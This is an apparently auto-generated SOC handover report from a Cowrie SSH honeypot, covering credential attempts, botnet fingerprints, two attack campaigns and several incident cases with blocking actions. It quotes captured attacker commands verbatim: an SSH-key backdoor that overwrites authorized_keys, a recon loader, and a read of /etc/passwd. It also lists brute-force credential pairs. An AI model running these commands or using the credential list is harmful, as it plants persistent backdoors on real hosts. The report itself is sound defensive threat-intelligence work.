# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-21 |
| **Generated At** | 2026-09-21T14:27:27Z |
| **Shift Time** | 14:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **296** |
| Confirmed Threats | **286** |
| False Positives Filtered | **10** (3.4%) |
| Unique Attacker IPs | **43** |
| Countries of Origin | **21** |
| High Severity Cases | **111** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **185** |
| Malware Samples Analyzed | **5** HIGH · **22** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **178** |
| Unique Credential Pairs | **130** |
| Unique Usernames | **40** |
| Unique Passwords | **113** |
| Successful Auth Pairs | **148** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 86 |
| `345gs5662d34` | 15 |
| `engineer` | 9 |
| `pi` | 5 |
| `support` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 18 |
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 15 |
| `support` | 4 |
| `LeitboGi0ro` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 15 |
| `root` | `3245gs5662d34` | 8 |
| `support` | `support` | 4 |
| `root` | `LeitboGi0ro` | 4 |
| `root` | `` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Galaxy@2017` | `10.0.0.73` | 2026-09-21T10:55:39 |
| `livy` | `livy` | `165.22.124.192` | 2026-09-21T10:57:17 |
| `root` | `Galaxy.1` | `10.0.0.73` | 2026-09-21T10:57:57 |
| `oozie` | `oozie` | `165.22.124.192` | 2026-09-21T11:00:02 |
| `root` | `Galaxy.12` | `10.0.0.73` | 2026-09-21T11:00:18 |
| `support` | `support` | `176.53.159.196` | 2026-09-21T11:01:18 |
| `root` | `Galaxy.123` | `10.0.0.73` | 2026-09-21T11:02:37 |
| `server` | `server` | `165.22.124.192` | 2026-09-21T11:02:45 |
| `root` | `fuckyou1` | `10.0.0.73` | 2026-09-21T11:05:08 |
| `storm` | `storm` | `165.22.124.192` | 2026-09-21T11:05:24 |
| `user` | `Qwerty12345` | `10.0.0.73` | 2026-09-21T11:05:53 |
| `root` | `fuckyou12` | `10.0.0.73` | 2026-09-21T11:07:25 |
| `tez` | `tez` | `165.22.124.192` | 2026-09-21T11:07:58 |
| `admin` | `admin` | `47.237.110.128` | 2026-09-21T11:08:37 |
| `root` | `fuckyou123` | `10.0.0.73` | 2026-09-21T11:09:46 |
| `wa1.keytab` | `wa1.keytab` | `165.22.124.192` | 2026-09-21T11:10:44 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-09-21T11:11:32 |
| `root` | `123@@@` | `144.22.238.238` | 2026-09-21T11:11:33 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-09-21T11:11:35 |
| `root` | `fuckyou2014` | `10.0.0.73` | 2026-09-21T11:11:51 |
| `yarn-ats` | `yarn-ats` | `165.22.124.192` | 2026-09-21T11:13:27 |
| `root` | `fuckyou2015` | `10.0.0.73` | 2026-09-21T11:13:54 |
| `root` | `fuckyou2016` | `10.0.0.73` | 2026-09-21T11:16:00 |
| `zookeeper` | `zookeeper` | `165.22.124.192` | 2026-09-21T11:16:14 |
| `root` | `fuckyou2017` | `10.0.0.73` | 2026-09-21T11:18:06 |
| `admin.keytab` | `admin.keytab` | `165.22.124.192` | 2026-09-21T11:18:53 |
| `root` | `------fuck------` | `113.46.184.80` | 2026-09-21T11:20:16 |
| `root` | `fuckyou!1` | `10.0.0.73` | 2026-09-21T11:20:19 |
| `ams` | `ams` | `165.22.124.192` | 2026-09-21T11:21:30 |
| `root` | `fuckyou!12` | `10.0.0.73` | 2026-09-21T11:22:36 |
| `engineer` | `1qaz@WSX` | `165.22.124.192` | 2026-09-21T11:24:12 |
| `root` | `fuckyou!123` | `10.0.0.73` | 2026-09-21T11:24:55 |
| `engineer` | `engineer` | `165.22.124.192` | 2026-09-21T11:26:51 |
| `root` | `fuckyou!1234` | `10.0.0.73` | 2026-09-21T11:27:11 |
| `tom` | `1234567` | `10.0.0.73` | 2026-09-21T11:28:02 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-21T11:28:04 |
| `tom` | `3245gs5662d34` | `10.0.0.73` | 2026-09-21T11:28:05 |
| `root` | `fuckyou@1` | `10.0.0.73` | 2026-09-21T11:29:27 |
| `pi` | `pi` | `165.22.124.192` | 2026-09-21T11:29:38 |
| `usman` | `usman@123` | `103.189.235.167` | 2026-09-21T11:31:28 |
| `345gs5662d34` | `345gs5662d34` | `103.189.235.167` | 2026-09-21T11:31:34 |
| `evan` | `evan` | `43.155.134.4` | 2026-09-21T11:31:34 |
| `345gs5662d34` | `345gs5662d34` | `43.155.134.4` | 2026-09-21T11:31:38 |
| `usman` | `3245gs5662d34` | `103.189.235.167` | 2026-09-21T11:31:38 |
| `evan` | `3245gs5662d34` | `43.155.134.4` | 2026-09-21T11:31:39 |
| `root` | `fuckyou@12` | `10.0.0.73` | 2026-09-21T11:31:42 |
| `root` | `123456Aa@` | `10.0.0.73` | 2026-09-21T11:32:15 |
| `pi` | `raspberry` | `165.22.124.192` | 2026-09-21T11:32:20 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-21T11:32:21 |
| `root` | `fuckyou@123` | `10.0.0.73` | 2026-09-21T11:34:02 |
| `root` | `!root` | `92.118.39.49` | 2026-09-21T11:34:14 |
| `root` | `12345` | `10.0.0.73` | 2026-09-21T11:34:54 |
| `root` | `ubuntu` | `171.216.139.21` | 2026-09-21T11:34:57 |
| `pi` | `12345678` | `165.22.124.192` | 2026-09-21T11:35:03 |
| `root` | `A123456!` | `74.118.81.174` | 2026-09-21T11:35:23 |
| `345gs5662d34` | `345gs5662d34` | `74.118.81.174` | 2026-09-21T11:35:28 |
| `root` | `3245gs5662d34` | `74.118.81.174` | 2026-09-21T11:35:29 |
| `prod` | `123` | `43.252.11.4` | 2026-09-21T11:35:43 |
| `345gs5662d34` | `345gs5662d34` | `43.252.11.4` | 2026-09-21T11:35:48 |
| `prod` | `3245gs5662d34` | `43.252.11.4` | 2026-09-21T11:35:52 |
| `root` | `111111` | `92.118.39.49` | 2026-09-21T11:36:06 |
| `root` | `fuckyou@1234` | `10.0.0.73` | 2026-09-21T11:36:20 |
| `test` | `pa$$w0rd` | `10.0.0.73` | 2026-09-21T11:36:42 |
| `test` | `3245gs5662d34` | `10.0.0.73` | 2026-09-21T11:36:48 |
| `pi` | `test@123` | `165.22.124.192` | 2026-09-21T11:37:44 |
| `root` | `123123` | `92.118.39.49` | 2026-09-21T11:38:05 |
| `root` | `fuckyou!2016` | `10.0.0.73` | 2026-09-21T11:38:41 |
| `root` | `123321` | `92.118.39.49` | 2026-09-21T11:40:17 |
| `pi` | `admin123` | `165.22.124.192` | 2026-09-21T11:40:22 |
| `root` | `fuckyou!2017` | `10.0.0.73` | 2026-09-21T11:40:56 |
| `wordpress` | `wordpress123` | `10.0.0.73` | 2026-09-21T11:41:48 |
| `wordpress` | `3245gs5662d34` | `10.0.0.73` | 2026-09-21T11:41:51 |
| `root` | `` | `77.90.185.17` | 2026-09-21T11:41:59 |
| `root` | `1234` | `92.118.39.49` | 2026-09-21T11:42:13 |
| `engineer` | `engineer@123` | `165.22.124.192` | 2026-09-21T11:43:07 |
| `root` | `fuckyou@2016` | `10.0.0.73` | 2026-09-21T11:43:14 |
| `root` | `12345` | `92.118.39.49` | 2026-09-21T11:44:06 |
| `engineer` | `engineer123` | `165.22.124.192` | 2026-09-21T11:45:47 |
| `test` | `123` | `193.187.110.214` | 2026-09-21T11:45:52 |
| `root` | `` | `10.0.0.73` | 2026-09-21T11:46:54 |
| `root` | `1234567` | `92.118.39.49` | 2026-09-21T11:47:40 |
| `root` | `fuckyou.1` | `10.0.0.73` | 2026-09-21T11:47:52 |
| `engineer` | `test@123` | `165.22.124.192` | 2026-09-21T11:48:36 |
| `support` | `support` | `10.0.0.73` | 2026-09-21T11:50:04 |
| `root` | `fuckyou.12` | `10.0.0.73` | 2026-09-21T11:50:18 |
| `engineer` | `root` | `165.22.124.192` | 2026-09-21T11:51:18 |
| `root` | `fuckyou.123` | `10.0.0.73` | 2026-09-21T11:52:38 |
| `engineer` | `admin` | `165.22.124.192` | 2026-09-21T11:53:58 |
| `root` | `fuckyou.1234` | `10.0.0.73` | 2026-09-21T11:55:00 |
| `root` | `1234Asdf` | `10.0.0.73` | 2026-09-21T11:55:07 |
| `engineer` | `test` | `165.22.124.192` | 2026-09-21T11:56:38 |
| `root` | `fuckyou.2016` | `10.0.0.73` | 2026-09-21T11:57:33 |
| `engineer` | `admin123` | `165.22.124.192` | 2026-09-21T11:59:17 |
| `dispatch-sjjr` | `dispatch-sjjr` | `165.22.124.192` | 2026-09-21T12:02:07 |
| `root` | `Fuckyou1` | `10.0.0.73` | 2026-09-21T12:02:22 |
| `elastic` | `elastic` | `165.22.124.192` | 2026-09-21T12:04:55 |
| `root` | `Fuckyou123` | `10.0.0.73` | 2026-09-21T12:07:06 |
| `hbase` | `hbase` | `165.22.124.192` | 2026-09-21T12:07:42 |
| `root` | `Fuckyou2014` | `10.0.0.73` | 2026-09-21T12:09:24 |
| `hive` | `hive` | `165.22.124.192` | 2026-09-21T12:10:22 |
| `infra-solr` | `infra-solr` | `165.22.124.192` | 2026-09-21T12:13:02 |
| `root` | `Fuckyou2016` | `10.0.0.73` | 2026-09-21T12:14:01 |
| `kafka.keytab` | `kafka.keytab` | `165.22.124.192` | 2026-09-21T12:15:49 |
| `root` | `Fuckyou2017` | `10.0.0.73` | 2026-09-21T12:16:21 |
| `ldapUserOper` | `ldapUserOper` | `165.22.124.192` | 2026-09-21T12:18:36 |
| `root` | `Fuckyou!1` | `10.0.0.73` | 2026-09-21T12:18:39 |
| `root` | `Fuckyou!12` | `10.0.0.73` | 2026-09-21T12:21:00 |
| `mapred` | `mapred` | `165.22.124.192` | 2026-09-21T12:21:26 |
| `root` | `Fuckyou!123` | `10.0.0.73` | 2026-09-21T12:23:19 |
| `root` | `Fuckyou!1234` | `10.0.0.73` | 2026-09-21T12:25:40 |
| `GET / HTTP/1.0` | `` | `172.236.233.65` | 2026-09-21T12:27:28 |
| `OPTIONS / HTTP/1.0` | `` | `172.236.233.65` | 2026-09-21T12:27:33 |
| `OPTIONS / RTSP/1.0` | `` | `172.236.233.65` | 2026-09-21T12:27:39 |
| `student` | `student` | `98.70.48.241` | 2026-09-21T12:27:51 |
| `345gs5662d34` | `345gs5662d34` | `98.70.48.241` | 2026-09-21T12:27:55 |
| `student` | `3245gs5662d34` | `98.70.48.241` | 2026-09-21T12:27:56 |
| `root` | `Fuckyou@1` | `10.0.0.73` | 2026-09-21T12:27:57 |
| `GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0` | `` | `172.236.233.65` | 2026-09-21T12:28:26 |
| `b'0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00'` | ` ` | `172.236.233.65` | 2026-09-21T12:28:36 |
| `OPTIONS sip:nm SIP/2.0` | `Via: SIP/2.0/TCP nm;branch=foo` | `172.236.233.65` | 2026-09-21T12:28:46 |
| `GET /devicedesc.xml HTTP/1.1` | `` | `172.236.233.65` | 2026-09-21T12:29:35 |
| `CONNECT` | `accept-version:1.2` | `172.236.233.65` | 2026-09-21T12:29:40 |
| `root` | `Server2025!` | `88.26.104.155` | 2026-09-21T12:29:47 |
| `345gs5662d34` | `345gs5662d34` | `88.26.104.155` | 2026-09-21T12:29:50 |
| `root` | `3245gs5662d34` | `88.26.104.155` | 2026-09-21T12:29:50 |
| `root` | `Fuckyou@12` | `10.0.0.73` | 2026-09-21T12:30:16 |
| `root` | `Fuckyou@123` | `10.0.0.73` | 2026-09-21T12:32:28 |
| `root` | `aA!123456` | `106.75.26.244` | 2026-09-21T12:34:35 |
| `345gs5662d34` | `345gs5662d34` | `106.75.26.244` | 2026-09-21T12:34:41 |
| `root` | `Fuckyou@1234` | `10.0.0.73` | 2026-09-21T12:34:42 |
| `root` | `3245gs5662d34` | `106.75.26.244` | 2026-09-21T12:34:43 |
| `root` | `Fuckyou!2016` | `10.0.0.73` | 2026-09-21T12:36:56 |
| `root` | `password` | `193.112.192.91` | 2026-09-21T12:37:04 |
| `root` | `Fuckyou!2017` | `10.0.0.73` | 2026-09-21T12:39:13 |
| `root` | `Fuckyou@2016` | `10.0.0.73` | 2026-09-21T12:41:27 |
| `root` | `bitcoin123` | `50.114.236.21` | 2026-09-21T12:42:02 |
| `345gs5662d34` | `345gs5662d34` | `50.114.236.21` | 2026-09-21T12:42:04 |
| `root` | `3245gs5662d34` | `50.114.236.21` | 2026-09-21T12:42:04 |
| `root` | `Asdqwe123` | `147.90.234.22` | 2026-09-21T12:42:11 |
| `345gs5662d34` | `345gs5662d34` | `147.90.234.22` | 2026-09-21T12:42:13 |
| `root` | `3245gs5662d34` | `147.90.234.22` | 2026-09-21T12:42:13 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-09-21T12:45:14 |
| `root` | `123@@@` | `165.1.75.106` | 2026-09-21T12:45:20 |
| `root` | `Fuckyou.1` | `10.0.0.73` | 2026-09-21T12:45:54 |
| `root` | `Fuckyou.12` | `10.0.0.73` | 2026-09-21T12:48:10 |
| `root` | `Fuckyou.123` | `10.0.0.73` | 2026-09-21T12:50:21 |
| `root` | `Fuckyou.1234` | `10.0.0.73` | 2026-09-21T12:52:36 |
| `root` | `Fuckyou.2016` | `10.0.0.73` | 2026-09-21T12:54:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **296** |
| Sessions with Fingerprint | **20** |
| Unique HASSH Fingerprints | **20** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 51 |
| libssh | 31 |
| Nmap scanner | 14 |
| OpenSSH | 14 |
| Paramiko (Python) | 9 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 32 | 1 |
| `f555226df196...` | Mirai/variant | 25 | 9 |
| `e788c657d1a2...` | Mirai/variant | 12 | 1 |
| `a2de0f306611...` | Mirai/variant | 9 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 8 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 32 | 1 | Generic scanner |
| `f555226df196...` | libssh | 25 | 9 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 12 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 9 | 3 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 8 | 1 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 7 | 2 | — |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 7 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 9 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.49`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `106.75.26.244`, `88.26.104.155`, `98.70.48.241`, `147.90.234.22`, `50.114.236.21`, `43.252.11.4`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **43** |
| Unique ASNs | **22** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 18 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS22927` | Telefonica de Argentina | 1 | LOW |
| `AS209334` | Modat B.V. | 1 | HIGH |
| `AS396982` | Google LLC | 1 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (110)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-77c8245e35c5

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 10:57 |
| **Last Seen** | 2026-09-21 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 10:57:17` | `cowrie.session.connect` |
| `2026-09-21 10:57:17` | `cowrie.client.version` |
| `2026-09-21 10:57:17` | `cowrie.client.kex` |
| `2026-09-21 10:57:17` | `cowrie.login.success` |
| `2026-09-21 10:57:18` | `cowrie.session.params` |
| `2026-09-21 10:57:18` | `cowrie.command.input` |
| `2026-09-21 10:57:18` | `cowrie.log.closed` |
| `2026-09-21 10:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f923131cb3bf

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:00 |
| **Last Seen** | 2026-09-21 11:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:00:02` | `cowrie.session.connect` |
| `2026-09-21 11:00:02` | `cowrie.client.version` |
| `2026-09-21 11:00:02` | `cowrie.client.kex` |
| `2026-09-21 11:00:02` | `cowrie.login.success` |
| `2026-09-21 11:00:03` | `cowrie.session.params` |
| `2026-09-21 11:00:03` | `cowrie.command.input` |
| `2026-09-21 11:00:03` | `cowrie.log.closed` |
| `2026-09-21 11:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-491e269624ff

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-21 11:01 |
| **Last Seen** | 2026-09-21 11:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:01:18` | `cowrie.session.connect` |
| `2026-09-21 11:01:18` | `cowrie.client.version` |
| `2026-09-21 11:01:18` | `cowrie.client.kex` |
| `2026-09-21 11:01:18` | `cowrie.login.success` |
| `2026-09-21 11:01:18` | `cowrie.direct-tcpip.request` |
| `2026-09-21 11:01:19` | `cowrie.direct-tcpip.data` |
| `2026-09-21 11:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ab927c92e58

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:02 |
| **Last Seen** | 2026-09-21 11:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:02:44` | `cowrie.session.connect` |
| `2026-09-21 11:02:44` | `cowrie.client.version` |
| `2026-09-21 11:02:44` | `cowrie.client.kex` |
| `2026-09-21 11:02:45` | `cowrie.login.success` |
| `2026-09-21 11:02:45` | `cowrie.session.params` |
| `2026-09-21 11:02:45` | `cowrie.command.input` |
| `2026-09-21 11:02:45` | `cowrie.log.closed` |
| `2026-09-21 11:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a33c30e60625

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:05 |
| **Last Seen** | 2026-09-21 11:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:05:24` | `cowrie.session.connect` |
| `2026-09-21 11:05:24` | `cowrie.client.version` |
| `2026-09-21 11:05:24` | `cowrie.client.kex` |
| `2026-09-21 11:05:24` | `cowrie.login.success` |
| `2026-09-21 11:05:25` | `cowrie.session.params` |
| `2026-09-21 11:05:25` | `cowrie.command.input` |
| `2026-09-21 11:05:25` | `cowrie.log.closed` |
| `2026-09-21 11:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db45eb70bb3f

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:07 |
| **Last Seen** | 2026-09-21 11:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:07:58` | `cowrie.session.connect` |
| `2026-09-21 11:07:58` | `cowrie.client.version` |
| `2026-09-21 11:07:58` | `cowrie.client.kex` |
| `2026-09-21 11:07:58` | `cowrie.login.success` |
| `2026-09-21 11:07:59` | `cowrie.session.params` |
| `2026-09-21 11:07:59` | `cowrie.command.input` |
| `2026-09-21 11:07:59` | `cowrie.log.closed` |
| `2026-09-21 11:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27aa131b757e

| Field | Detail |
|---|---|
| **Source IP** | `47.237.110[.]128` |
| **First Seen** | 2026-09-21 11:08 |
| **Last Seen** | 2026-09-21 11:09 |
| **Session Duration** | 62s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:08:36` | `cowrie.session.connect` |
| `2026-09-21 11:08:37` | `cowrie.telnet.option` |
| `2026-09-21 11:08:37` | `cowrie.telnet.option` |
| `2026-09-21 11:08:37` | `cowrie.login.success` |
| `2026-09-21 11:08:37` | `cowrie.session.params` |
| `2026-09-21 11:08:38` | `cowrie.telnet.option` |
| `2026-09-21 11:08:38` | `cowrie.telnet.option` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.failed` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.failed` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.failed` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.failed` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.failed` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.failed` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.failed` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.failed` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:08:38` | `cowrie.command.input` |
| `2026-09-21 11:09:38` | `cowrie.log.closed` |
| `2026-09-21 11:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.237.110[.]128` to AbuseIPDB if not already reported
- [ ] Block `47.237.110[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-339bde2ac00b

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:10 |
| **Last Seen** | 2026-09-21 11:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:10:44` | `cowrie.session.connect` |
| `2026-09-21 11:10:44` | `cowrie.client.version` |
| `2026-09-21 11:10:44` | `cowrie.client.kex` |
| `2026-09-21 11:10:44` | `cowrie.login.success` |
| `2026-09-21 11:10:45` | `cowrie.session.params` |
| `2026-09-21 11:10:45` | `cowrie.command.input` |
| `2026-09-21 11:10:45` | `cowrie.log.closed` |
| `2026-09-21 11:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
